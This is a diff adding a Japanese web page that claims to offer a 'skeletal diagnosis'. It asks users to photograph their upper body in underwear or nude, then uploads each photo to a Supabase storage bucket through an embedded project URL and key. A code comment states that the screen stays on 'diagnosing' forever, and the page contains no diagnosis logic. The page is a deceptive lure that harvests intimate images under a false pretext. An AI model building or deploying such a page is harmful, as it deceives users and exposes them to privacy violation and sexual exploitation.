@@ -1,1 +1,125 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <title>骨格診断</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
+  <style>
+    body {
+      margin: 0;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #fafafa;
+      text-align: center;
+    }
+    h1 {
+      margin: 20px 0;
+    }
+    video, canvas {
+      width: 90%;
+      max-width: 420px;
+      border-radius: 14px;
+      margin-top: 16px;
+    }
+    button {
+      margin-top: 20px;
+      padding: 14px 32px;
+      font-size: 16px;
+      border: none;
+      border-radius: 999px;
+      background: #111;
+      color: #fff;
+    }
+    .note {
+      margin: 18px;
+      font-size: 12px;
+      color: #666;
+      line-height: 1.6;
+    }
+    .loading {
+      display: none;
+      margin-top: 40px;
+    }
+    .spinner {
+      width: 44px;
+      height: 44px;
+      border: 4px solid #ddd;
+      border-top: 4px solid #111;
+      border-radius: 50%;
+      margin: 0 auto 12px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+
+<body>
+
+  <h1>骨格診断</h1>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <br />
+  <button id="shoot">撮影する</button>
+
+  <div class="loading" id="loading">
+    <div class="spinner"></div>
+    <p>診断中です…</p>
+  </div>
+
+  <div class="note">
+    ※上半身の骨格が判断できる状態（肌着、または何も着用していない状態）で撮影してください<br />
+    ※逆光にならないよう撮影してください
+  </div>
+
+  <!-- Supabase -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+  <script>
+    // ★ここだけ入れ替える
+    const SUPABASE_URL = "https://kbwfkjwctbaxshxnohwf.supabase.co";
+    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imtid2ZrandjdGJheHNoeG5vaHdmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njc1NTUzMzgsImV4cCI6MjA4MzEzMTMzOH0.c9ARvRd0p7zUwzSfGlQ1nWNIjkXNc0ONGVwKsR9Skx4";
+
+    const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const shootBtn = document.getElementById("shoot");
+    const loading = document.getElementById("loading");
+
+    // インカメ起動
+    navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" }
+    }).then(stream => {
+      video.srcObject = stream;
+    });
+
+    // 撮影 → アップロード → 診断中固定表示
+    shootBtn.onclick = async () => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+
+      // UI切り替え
+      loading.style.display = "block";
+      shootBtn.style.display = "none";
+      video.style.display = "none";
+
+      const blob = await new Promise(resolve =>
+        canvas.toBlob(resolve, "image/jpeg", 0.9)
+      );
+
+      const fileName = Date.now() + ".jpg";
+
+      await supabase.storage
+        .from("photos")
+        .upload(fileName, blob, { upsert: true });
+      // ※ 成功しても画面は切り替えない（ずっと診断中）
+    };
+  </script>
+
+</body>
+</html>
